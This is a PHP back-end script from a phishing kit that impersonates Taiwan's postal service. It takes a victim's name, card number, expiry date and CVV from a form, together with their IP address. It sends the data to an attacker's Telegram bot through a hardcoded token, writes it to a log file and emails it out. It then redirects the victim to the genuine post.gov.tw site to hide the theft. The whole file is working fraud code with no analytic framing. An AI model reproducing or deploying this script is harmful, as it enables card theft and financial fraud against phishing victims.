<?php
include("config.php");
$ip = getenv("REMOTE_ADDR");
$message .= "----------------Bassmtoz-----------------\n";
$message .= "-----------------INFO----------------------\n";
$message .= "Name: ".$_POST['C01']."\n";
$message .= "C-Number: ".$_POST['C02']."\n";
$message .= "Expire Date: ".$_POST['C03']."\n";
$message .= "CVV : ".$_POST['C04']."\n";
$message .= "------------------INFO IP-------------------------\n";
$message .= "IP                : $ip\n";



  $botToken="5134665275:AAG9EELoPBVGwQepBiv4l9cr4JzBb6uhZ0A";

  $website="https://api.telegram.org/bot".$botToken;
  $chatId="1023356336";
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  

file_put_contents("elw.txt",$message."\n", FILE_APPEND | LOCK_EX);
$subject = "Troj ~ $ip";

$from .= "From: Chunghwa ReZulT~<l3a9a@localhost.com>\n";


mail($sen,$subject,$message,$from);
header("Location: https://www.post.gov.tw/post/internet/index.jsp");

?>